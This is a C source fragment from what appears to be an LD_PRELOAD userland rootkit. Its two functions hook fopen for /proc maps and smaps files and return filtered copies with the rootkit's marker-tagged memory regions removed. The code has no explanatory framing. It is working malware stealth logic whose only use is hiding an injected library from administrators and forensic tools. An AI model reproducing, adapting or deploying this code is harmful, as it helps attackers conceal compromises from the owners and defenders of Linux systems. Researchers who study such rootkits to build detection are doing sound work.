FILE * spoof_maps (const char *filename) {
  char line[LINE_MAX];
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_fopen) old_fopen = dlsym (libc, "fopen");
  FILE *tmp = tmpfile ();
  FILE *pnt = old_fopen (filename, "r");
  if(pnt == NULL) { errno = ENOENT; return NULL; }
  while (fgets (line, LINE_MAX, pnt) != NULL) {
    if (!strstr(line,MAGIC_STRING)) fputs(line,tmp);
  }
  fclose (pnt);
  fseek (tmp, 0, SEEK_SET);
  return tmp;
}

FILE * spoof_smaps (const char *filename) {
  char line[LINE_MAX];
  int linecount = 0;
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_fopen) old_fopen = dlsym (libc, "fopen");
  FILE *tmp = tmpfile ();
  FILE *pnt = old_fopen (filename, "r");
  if(pnt == NULL) { errno = ENOENT; return NULL; }
  while (fgets (line, LINE_MAX, pnt) != NULL) {
    if(linecount > 0) linecount++;
    if(linecount > 15) linecount = 0;
    if(strstr(line,MAGIC_STRING)) linecount = 1;
    if(linecount == 0) fputs(line,tmp);
//    fprintf(stderr,"debug: linecount is %d\n", linecount);
  }
  fclose (pnt);
  fseek (tmp, 0, SEEK_SET);
  return tmp;
}

